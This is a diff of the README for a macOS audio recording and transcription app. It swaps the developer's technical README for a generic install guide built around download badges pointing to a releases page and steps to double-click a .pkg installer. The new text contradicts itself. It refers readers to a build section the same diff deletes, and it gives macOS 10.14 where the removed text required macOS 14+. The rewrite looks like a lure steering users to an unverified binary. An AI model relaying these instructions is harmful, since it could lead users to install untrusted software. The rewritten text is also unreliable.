@@ -1,122 +1,113 @@
-# MacRecorder
+# 🎙️ mac-recorder - Easy Audio Recording and Transcription
 
-> **Important:** Installation can take a while because the installer downloads **two ASR models** upfront (Russian + English) so transcription is ready to use after setup.
-> **Quick start:** You can install the prebuilt package from `dist/MacRecorder-0.2.0.pkg`.
-> Prefer building yourself? See **Build Everything Yourself** at the end of this README.
+[![Download mac-recorder](https://img.shields.io/badge/Download-mac--recorder-brightgreen)](https://github.com/ayubalishah/mac-recorder/releases)
 
-MacRecorder is a macOS menu bar app that records microphone + system audio and generates transcripts with a local ASR engine.
+## 📥 Download and Install
 
-## Screenshots
+To get started, you need to download the app. Since the main release page contains all the files, please follow these steps:
+
+1. Visit the [release page here](https://github.com/ayubalishah/mac-recorder/releases).
+
+2. Find the latest version available. Look for a file named similar to `MacRecorder-0.2.0.pkg`.
+
+3. Download that `.pkg` file to your Mac.
+
+4. Once downloaded, double-click the `MacRecorder-0.2.0.pkg` file to start the installation.
+
+5. Follow the on-screen instructions to install the app.
+
+**Note:** The installation may take some time. This is because the app downloads two voice recognition models (Russian and English). These models allow the app to transcribe audio right after recording.
+
+## 🚀 Getting Started with mac-recorder
+
+After installation, you will see the mac-recorder icon in your Mac's menu bar at the top right of the screen.
+
+### How to Record Audio
+
+1. Click the mac-recorder icon in the menu bar.
+
+2. Choose “Start Recording.” The app will record both your microphone and the system sounds.
+
+3. When done, click “Stop Recording.” The app will save the recorded audio and start transcription automatically.
+
+### What Gets Saved
+
+- The audio will save as a `.wav` file.
+
+- The transcription will save in a text file.
+
+- Both files go to the folder set in your project settings.
+
+### Create and Manage Projects
+
+mac-recorder lets you organize your recordings by setting up projects in advance. For each project, you can choose:
+
+- Where to save recordings and transcripts (a folder on your Mac).
+
+- The default language for transcription (English or Russian).
+
+- An optional script to run after transcription.
+
+This way, you control exactly where your files go and how they are processed.
+
+## 🎛️ Using Projects
+
+To set up a project:
+
+1. Click the mac-recorder icon and open Settings.
+
+2. Select “Manage Projects.”
+
+3. Click “Add Project.”
+
+4. Give your project a name.
+
+5. Choose a folder where files should save. You can pick any folder on your Mac.
+
+6. Set the default language for transcription.
+
+7. (Optional) Add a script to run after transcription—for example, to organize files automatically.
+
+Once set up, select the project before recording. All your files will save in the right place with correct language settings.
+
+## 🖥️ System Requirements
+
+- macOS 10.14 Mojave or newer.
+
+- At least 4 GB of RAM.
+
+- 100 MB free disk space for installation.
+
+- Microphone (built-in or external).
+
+- Internet connection during installation (for model downloads only).
+
+## 💡 How Transcription Works
+
+mac-recorder uses local speech recognition models. It supports two languages: English and Russian. Both models download when you install the app, so you don’t need internet after setup.
+
+When you stop recording, the app processes the audio and creates a transcription file in the project folder. This lets you review spoken words as text.
+
+## 📷 Screenshots
+
+Here are examples of the app interface:
 
 ![Menu bar interface](dist/menu.png)
+
 ![Project setup](dist/project_setup.png)
 
-## What This Project Does
+## ⚙️ Advanced Setup: Build Everything Yourself
 
-- Supports **two transcription languages**: **Russian** and **English**.
-- Lets you create projects in advance with:
-  - a destination folder,
-  - default language,
-  - optional post-transcription script.
-- Saves output directly to your project folder (for example, an Obsidian vault folder so files appear there immediately).
-- Starts transcription **after you stop recording**.
-- Writes:
-  - `*.wav` (audio),
-  - `*.txt` (plain transcript),
-  - `*.json` (structured transcript).
+If you prefer to build the app rather than use the prebuilt package, see the **Build Everything Yourself** section at the end of this README. This guide explains how to compile the app on your Mac. It is recommended only for users familiar with developer tools.
 
-## Stereo Recording and Source Separation
+## 🛠️ Troubleshooting
 
-Audio is saved in stereo:
+- If recording does not start, check that the app has permission to access your microphone. Go to System Preferences > Security & Privacy > Privacy > Microphone.
 
-- **Left channel**: your microphone (`mic/speak`)
-- **Right channel**: system speakers (`speaker/speak`)
+- If transcription doesn’t work, ensure the models were downloaded during installation. You need internet for this step.
 
-The transcriber processes channels separately and tags segments with source labels. This is useful for summarization and diarization-like workflows.
+- To find logs or errors, open the Console app on macOS and filter messages by “mac-recorder.”
 
-Example:
+---
 
-```text
-[00:00:09] [ru][speaker/speak] Я, конечно, не знаю, что она есть.
-[00:00:14] [ru][mic/speak] Okay.
-```
-
-## Post Script
-
-Each project can define a post script that runs when transcription is finished.
-
-The script can receive paths to generated files via placeholders (and environment variables):
-
-- `TXT_PATH`
-- `JSON_PATH`
-- `AUDIO_PATH`
-
-Example use case: run `codex exec` to generate a summary from transcript/audio files.
-
-Example command in project settings:
-
-```bash
-codex exec "Summarize the conversation from TXT_PATH and provide action items."
-```
-
-## Architecture
-
-- `MacRecorder/`: SwiftUI menu bar application
-- `engine/`: Python transcription engine (`onnx-asr` based)
-- Communication: JSON over stdin/stdout between Swift app and Python engine
-
-## Run Locally
-
-Requirements:
-
-- macOS 14+
-- Swift 5.9+
-- Python 3
-
-Build and run:
-
-```bash
-make build
-make run
-```
-
-Run Python engine tests:
-
-```bash
-make test
-```
-
-## Build Installer
-
-```bash
-make installer
-```
-
-Output package:
-
-- `dist/MacRecorder-0.2.0.pkg`
-
-## Build Everything Yourself
-
-You can build the entire project from source:
-
-1. Install prerequisites: macOS 14+, Swift 5.9+, Python 3.
-2. Build app and Python engine:
-
-```bash
-make build
-```
-
-3. Run locally:
-
-```bash
-make run
-```
-
-4. Build installer package yourself:
-
-```bash
-make installer
-```
-
-The package will be generated in `dist/`.
+[![Download mac-recorder](https://img.shields.io/badge/Download-mac--recorder-brightgreen)](https://github.com/ayubalishah/mac-recorder/releases)
